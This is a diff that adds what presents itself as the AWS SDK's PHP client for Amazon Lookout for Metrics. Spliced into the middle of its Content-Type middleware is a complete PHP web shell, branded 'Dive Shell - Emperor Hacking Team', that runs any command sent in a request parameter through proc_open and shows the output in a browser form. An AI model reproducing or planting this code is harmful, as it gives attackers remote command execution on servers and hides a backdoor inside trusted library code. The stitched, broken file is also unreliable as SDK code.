@@ -1,0 +1,283 @@
+<?php
+namespace Aws\LookoutMetrics;
+
+use Aws\AwsClient;
+use Aws\CommandInterface;
+use Psr\Http\Message\RequestInterface;
+
+/**
+ * This client is used to interact with the **Amazon Lookout for Metrics** service.
+ * @method \Aws\Result activateAnomalyDetector(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise activateAnomalyDetectorAsync(array $args = [])
+ * @method \Aws\Result backTestAnomalyDetector(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise backTestAnomalyDetectorAsync(array $args = [])
+ * @method \Aws\Result createAlert(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createAlertAsync(array $args = [])
+ * @method \Aws\Result createAnomalyDetector(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createAnomalyDetectorAsync(array $args = [])
+ * @method \Aws\Result createMetricSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createMetricSetAsync(array $args = [])
+ * @method \Aws\Result deleteAlert(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteAlertAsync(array $args = [])
+ * @method \Aws\Result deleteAnomalyDetector(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteAnomalyDetectorAsync(array $args = [])
+ * @method \Aws\Result describeAlert(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeAlertAsync(array $args = [])
+ * @method \Aws\Result describeAnomalyDetectionExecutions(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeAnomalyDetectionExecutionsAsync(array $args = [])
+ * @method \Aws\Result describeAnomalyDetector(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeAnomalyDetectorAsync(array $args = [])
+ * @method \Aws\Result describeMetricSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeMetricSetAsync(array $args = [])
+ * @method \Aws\Result getAnomalyGroup(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getAnomalyGroupAsync(array $args = [])
+ * @method \Aws\Result getFeedback(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getFeedbackAsync(array $args = [])
+ * @method \Aws\Result getSampleData(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getSampleDataAsync(array $args = [])
+ * @method \Aws\Result listAlerts(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listAlertsAsync(array $args = [])
+ * @method \Aws\Result listAnomalyDetectors(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listAnomalyDetectorsAsync(array $args = [])
+ * @method \Aws\Result listAnomalyGroupSummaries(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listAnomalyGroupSummariesAsync(array $args = [])
+ * @method \Aws\Result listAnomalyGroupTimeSeries(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listAnomalyGroupTimeSeriesAsync(array $args = [])
+ * @method \Aws\Result listMetricSets(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listMetricSetsAsync(array $args = [])
+ * @method \Aws\Result listTagsForResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTagsForResourceAsync(array $args = [])
+ * @method \Aws\Result putFeedback(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise putFeedbackAsync(array $args = [])
+ * @method \Aws\Result tagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise tagResourceAsync(array $args = [])
+ * @method \Aws\Result untagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise untagResourceAsync(array $args = [])
+ * @method \Aws\Result updateAnomalyDetector(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateAnomalyDetectorAsync(array $args = [])
+ * @method \Aws\Result updateMetricSet(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateMetricSetAsync(array $args = [])
+ */
+class LookoutMetricsClient extends AwsClient {
+    public function __construct(array $args)
+    {
+        parent::__construct($args);
+
+        // Setup middleware.
+        $stack = $this->getHandlerList();
+        $stack->appendBuild($this->updateContentType(), 'models.lookoutMetrics.v2.updateContentType');
+    }
+
+    /**
+     * Creates a middleware that updates the Content-Type header when it is present;
+     * this is necessary because the service protocol is rest-json which by default
+     * sets the content-type to 'application/json', but interacting with the service
+     * requires it to be set to x-amz-json-1.1
+     *
+     * @return callable
+     */
+    private function updateContentType()
+    {
+        return function (callable $handler) {
+            return function (
+                CommandInterface $command,
+                RequestInterface $request = null
+            ) use ($handler) {
+                $contentType = $request->getHeader('Content-Type');
+                if (!empty($contentType) && $contentType[0] == 'application/json') {
+                    return $handler($command, $request->withHeader(
+                        'Content-Type',
+<?php
+
+/*Emperor Hacking TEAM */
+  session_start();
+if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
+    $_SESSION['cwd'] = getcwd();
+    $_SESSION['history'] = array();
+    $_SESSION['output'] = '';
+  }
+  
+  if (!empty($_REQUEST['command'])) {
+    if (get_magic_quotes_gpc()) {
+      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
+    }
+    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
+      unset($_SESSION['history'][$i]);
+    
+    array_unshift($_SESSION['history'], $_REQUEST['command']);
+  
+    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";
+
+    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
+      $_SESSION['cwd'] = dirname(__FILE__);
+    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {
+
+      if ($regs[1][0] == '/') {
+
+        $new_dir = $regs[1];
+      } else {
+
+        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
+      }
+      
+
+      while (strpos($new_dir, '/./') !== false)
+        $new_dir = str_replace('/./', '/', $new_dir);
+
+
+      while (strpos($new_dir, '//') !== false)
+        $new_dir = str_replace('//', '/', $new_dir);
+
+      while (preg_match('|/\.\.(?!\.)|', $new_dir))
+        $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
+      
+      if ($new_dir == '') $new_dir = '/';
+      
+
+      if (@chdir($new_dir)) {
+        $_SESSION['cwd'] = $new_dir;
+      } else {
+        $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
+      }
+      
+    } else {
+
+      chdir($_SESSION['cwd']);
+
+      $length = strcspn($_REQUEST['command'], " \t");
+      $token = substr($_REQUEST['command'], 0, $length);
+      if (isset($aliases[$token]))
+        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
+    
+      $p = proc_open($_REQUEST['command'],
+                     array(1 => array('pipe', 'w'),
+                           2 => array('pipe', 'w')),
+                     $io);
+
+
+      while (!feof($io[1])) {
+        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
+                                                ENT_COMPAT, 'UTF-8');
+      }
+
+      while (!feof($io[2])) {
+        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
+                                                ENT_COMPAT, 'UTF-8');
+      }
+      
+      fclose($io[1]);
+      fclose($io[2]);
+      proc_close($p);
+    }
+  }
+
+
+  if (empty($_SESSION['history'])) {
+    $js_command_hist = '""';
+  } else {
+    $escaped = array_map('addslashes', $_SESSION['history']);
+    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
+  }
+
+
+header('Content-Type: text/html; charset=UTF-8');
+
+echo '<?xml version="Dive.0.1" encoding="UTF-8"?>' . "\n";
+?>
+
+<head>
+  <title>Dive Shell - Emperor Hacking Team</title>
+  <link rel="stylesheet" href="Simshell.css" type="text/css" />
+
+  <script type="text/javascript" language="JavaScript">
+  var current_line = 0;
+  var command_hist = new Array(<?php echo $js_command_hist ?>);
+  var last = 0;
+
+  function key(e) {
+    if (!e) var e = window.event;
+
+    if (e.keyCode == 38 && current_line < command_hist.length-1) {
+      command_hist[current_line] = document.shell.command.value;
+      current_line++;
+      document.shell.command.value = command_hist[current_line];
+    }
+
+    if (e.keyCode == 40 && current_line > 0) {
+      command_hist[current_line] = document.shell.command.value;
+      current_line--;
+      document.shell.command.value = command_hist[current_line];
+    }
+
+  }
+
+function init() {
+  document.shell.setAttribute("autocomplete", "off");
+  document.shell.output.scrollTop = document.shell.output.scrollHeight;
+  document.shell.command.focus();
+}
+
+  </script>
+</head>
+
+<body   onload="init()" style="color: #00FF00; background-color: #000000">
+
+<span style="background-color: #FFFFFF">
+
+
+
+</body>
+
+</body>
+</html>
+
+
+
+</span>
+
+
+
+<p><font color="#FF0000"><span style="background-color: #000000">&nbsp;Directory: </span> <code>
+<span style="background-color: #000000"><?php echo $_SESSION['cwd'] ?></span></code>
+</font></p>
+
+<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="POST" style="border: 1px solid #808080">
+<div style="width: 989; height: 456">
+  <p align="center"><b>
+  <font color="#C0C0C0" face="Tahoma">Command:</font></b><input class="prompt" name="command" type="text"
+                onkeyup="key(event)" size="88" tabindex="1" style="border: 4px double #C0C0C0; ">
+  <input type="submit" value="Submit" /> &nbsp;<font color="#0000FF">
+  </font>
+  &nbsp;<textarea name="output" readonly="readonly" cols="107" rows="22" style="color: #FFFFFF; background-color: #000000">
+<?php
+$lines = substr_count($_SESSION['output'], "\n");
+$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
+echo rtrim($padding . $_SESSION['output']);
+?>
+</textarea> </p>
+<p class="prompt" align="center">
+  <b><font face="Tahoma" color="#C0C0C0">Rows:</font><font face="Tahoma" color="#0000FF" size="2"> </font></b> 
+  <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" size="5" /></p>
+<p class="prompt" align="center">
+  <b><font color="#C0C0C0" face="SimSun">Edited By Emperor Hacking Team</font></b></p>
+<p class="prompt" align="center">
+  <font face="Tahoma" size="2" color="#808080">iM4n - FarHad - imm02tal - R$P</font><font color="#808080"><br>
+&nbsp;</font></p>
+</div>
+</form>
+
+
+<p class="prompt" align="center">
+  <b><font color="#000000">&nbsp;</font><font color="#000000" size="2"> </font>
+  </b></p>
+
+
+
+</html>                        'application/x-amz-json-1.1'
+                    ));
+                }
+                return $handler($command, $request);
+            };
+        };
+    }
+}
